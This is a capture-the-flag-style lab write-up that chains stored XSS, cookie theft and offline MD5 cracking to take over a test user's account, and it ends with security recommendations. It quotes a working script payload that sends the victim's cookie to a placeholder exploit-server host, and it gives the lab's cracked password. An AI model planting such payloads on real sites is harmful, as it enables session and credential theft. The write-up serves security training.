# 🧪 Lab 04 – Offline Password Cracking

---

## 📘 Lab Overview

This lab explores the dangers of insecure cookie design and weak password hashing mechanisms. The application stores user credentials in a persistent cookie and contains a stored cross-site scripting (XSS) vulnerability within its comment system. The objective is to obtain Carlos’s `stay-logged-in` cookie via XSS, decode and crack the MD5 hash offline, then use the recovered credentials to log in and delete the account.

---

## 🔍 Step-by-Step Walkthrough

### Step 1 – Investigate the Cookie Format

- Log in using any test account.
- Open **Burp Suite** > Proxy > HTTP history.
- Locate the `stay-logged-in` cookie in the login response.
- Decode it using **Burp Decoder**: `base64(username:md5(password))`

---

### Step 2 – Leverage XSS for Cookie Exfiltration

- Post a comment on any blog using this stored XSS payload:
```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
- Replace YOUR-EXPLOIT-SERVER-ID with your actual exploit server domain
```

### Step 3 – Collect the Victim’s Cookie
Navigate to the exploit server → access log.

Locate the incoming request from the victim browser containing:

`stay-logged-in=carlos:26323c16d5f4dabff3bb136f2460a943`
Copy and decode the cookie structure.


### Step 4 – Crack the MD5 Hash Offline
Search the hash using an online MD5 database:

`26323c16d5f4dabff3bb136f2460a943 → onceuponatime`

### Step 5 – Authenticate and Delete the Account
Log in using:

Username: carlos

Password: onceuponatime

Navigate to My Account and click Delete Account.

---

### ✅ Key Takeaways
Storing hashed passwords in client-side cookies exposes them to offline attacks.

MD5 is a weak and outdated hashing algorithm, easily cracked using public databases.

Stored XSS vulnerabilities pose a high risk when used to steal authentication tokens.

Cookie construction using predictable patterns undermines authentication security.

⚠️ Security Recommendations
 - Avoid storing authentication tokens or hashes in client-side cookies.
 - Use cryptographically secure formats for persistent login (e.g., server-side tokens).
 - Replace MD5 with modern algorithms like bcrypt, Argon2, or scrypt.
 - Always sanitize user input to prevent stored XSS attacks.
 - Enforce cookie attributes:
   - HttpOnly
   - Secure
   - SameSite

- Limit authentication lifespan and apply device/session binding.

This lab emphasizes the dangers of poor authentication design and highlights how multiple vulnerabilities—when chained—can lead to complete compromise of user accounts.

### ✅ Status
 🎉 Lab Solved
